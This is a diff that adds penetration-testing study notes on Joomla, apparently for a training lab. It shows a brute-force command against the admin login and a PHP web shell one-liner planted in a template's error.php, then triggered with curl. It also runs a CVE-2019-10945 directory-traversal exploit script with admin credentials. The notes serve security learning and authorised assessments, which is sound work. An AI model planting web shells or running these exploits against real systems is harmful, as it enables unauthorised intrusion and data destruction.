@@ -252,3 +252,25 @@ We can use [this script](https://github.com/ajnik/joomla-bruteforce):
 ```
 sudo python3 joomla-brute.py -u http://dev.company.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 ```
+
+## Attacking Joomla
+If we find access to the admin panel, we can check the Templates and edit one of the pages by adding a one-liner:
+```
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+```
+then we can execute code with a `curl` command:
+```
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+```
+Here we edited the `error.php` page.
+*Note: It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.*
+
+### Leveraging Known Vulnerabilities
+Once we find the version, we can look for exploits in `exploit-db`.
+
+#### Example
+[CVE-2019-10945](https://www.cve.org/CVERecord?id=CVE-2019-10945) is a directory traversal and authenticated file deletion vulnerability. We can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945).
+
+```
+python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+```
